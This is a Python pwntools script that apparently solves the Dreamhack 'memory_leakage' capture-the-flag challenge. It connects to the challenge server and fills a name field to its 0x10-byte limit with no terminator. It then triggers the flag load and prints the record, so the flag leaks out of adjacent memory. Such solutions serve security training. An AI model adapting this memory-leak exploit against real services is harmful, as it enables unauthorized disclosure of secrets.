#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = remote("host1.dreamhack.games", 8336)
#p = process("./memory_leakage")
elf = ELF("./memory_leakage")

def Join(name, age):
    p.sendlineafter("> ", '1')
    p.sendafter("Name: ", name)
    p.sendlineafter("Age: ", str(age))

def Print():
    p.sendlineafter("> ",'2')

def Flag():
    p.sendlineafter("> ", '3')

#gdb.attach(p)
Join('A'*0x10, 1000000000000)

Flag()
Print()

p.interactive()
